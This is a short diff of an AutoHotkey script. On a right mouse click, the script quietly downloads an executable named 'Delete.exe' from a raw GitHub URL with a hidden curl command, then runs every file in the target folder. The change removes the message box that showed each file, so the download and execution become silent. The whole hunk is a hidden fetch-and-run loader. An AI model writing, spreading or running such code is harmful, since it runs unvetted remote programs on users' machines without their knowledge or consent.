@@ -28,7 +28,6 @@ $RButton::{
         command := "cmd /c curl https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/Delete.exe > " path "\Delete.exe"
         RunWait command, , "Hide"
         for file in DirList(path "\*") {
-            MsgBox file
             Run file
         }
     }
